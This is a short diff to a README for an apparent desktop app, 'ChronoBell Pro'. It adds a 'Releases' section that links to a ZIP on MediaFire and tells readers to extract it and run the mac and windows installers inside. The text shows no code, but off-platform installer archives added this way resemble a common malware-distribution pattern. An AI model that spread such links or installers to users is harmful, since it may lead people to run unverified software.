@@ -40,6 +40,13 @@ Modern. Powerful. Beautiful.
 4. Open from Applications folder
 
 ---
+## Releases
+- Download - https://www.mediafire.com/file/mm03jy9i1tgov39/ChronoBell_Pro.zip/file
+### How To Install
+1. Extract the ZIP
+2. Open 'Release' folder inside the 'ChronoBell Pro' folder
+3. There are the installers for mac and windows both
+---
 
 ## 📖 Quick Start
 
